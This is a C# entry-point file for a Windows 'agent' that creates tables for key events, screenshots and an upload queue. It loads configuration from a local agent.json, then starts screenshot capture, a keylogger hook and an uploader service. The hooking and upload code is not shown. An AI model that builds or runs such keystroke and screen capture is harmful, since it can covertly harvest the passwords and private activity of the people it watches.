using Common.ConfigurationManager;
using Common.Helpers;
using Common.Interfaces;
using Common.Models;
using KeyLogger.Interfaces;
using ks.EngineServices;
using Newtonsoft.Json;
using Screenshot.Interfaces;
using Screenshot.Services;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace ks
{
    public class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            ILogger logger = new Logger();
            try
            {
                DBContexts.CreateTableIfNotExists<Configurations>();
                DBContexts.CreateTableIfNotExists<KeyEvents>();
                DBContexts.CreateTableIfNotExists<KeySessions>();
                DBContexts.CreateTableIfNotExists<Machines>();
                DBContexts.CreateTableIfNotExists<Screenshots>();
                DBContexts.CreateTableIfNotExists<UploadQueue>();
                DBContexts.CreateTableIfNotExists<KeyLoggerConf>();
                DBContexts.CreateTableIfNotExists<ScreenshotConf>();
                DBContexts.CreateTableIfNotExists<UploadConf>();
                DBContexts.CreateTableIfNotExists<LoggerEntry>();
                logger.LogInformation("All database tables verified or created.");

                string configPath = @"C:\Users\xushn\OneDrive\Desktop\ks\ks\agent.json";

                Dictionary<string, string> configDict;

                if (File.Exists(configPath))
                {
                    string jsonContent = File.ReadAllText(configPath);
                    var configList = JsonConvert.DeserializeObject<List<Configurations>>(jsonContent);

                    if (configList != null && configList.Count > 0)
                    {
                        configDict = configList.ToDictionary(c => c.Name, c => c.Value);

                        foreach (var kv in configDict)
                        {
                            var config = new Configurations
                            {
                                Name = kv.Key,
                                Value = kv.Value
                            };
                            DBContexts.InsertOrUpdateConfig(config);
                        }
                        logger.LogInformation("Configurations loaded from agent.json and inserted into DB.");
                    }
                    else
                    {
                        configDict = new Dictionary<string, string>();
                        logger.LogInformation("agent.json is empty. Using default configuration.");
                    }
                }
                else
                {
                    configDict = new Dictionary<string, string>();
                    logger.LogInformation("agent.json not found. Using default configuration.");
                }

                ConfigurationApplier.Apply(configDict, logger);
                logger.LogInformation("Configuration successfully applied.");

                ITakeScreenshot screenshot = new TakeScreenshot(logger);
                ICaptureWithInterval captureScr = new CaptureWithInterval(screenshot, logger);
                captureScr.Capture();
                logger.LogInformation("Screenshot capture service started.");

                IKeyLoggerEngine engine = new KeyLoggerEngine(logger);
                IKeyLoggerHook hook = new KeyloggerHook(engine, logger);
                hook.Start();
                logger.LogInformation("Keylogger hook started.");

                UploaderService uploader = new UploaderService(logger);
                logger.LogInformation("Uploader service initialized.");

                logger.LogInformation("Agent is running. Press Ctrl+C to exit.");
                System.Windows.Forms.Application.Run();
            }
            catch (Exception ex)
            {
                logger.LogError($"Fatal error: {ex.Message}\nStackTrace: {ex.StackTrace}");
            }
        }
    }
}
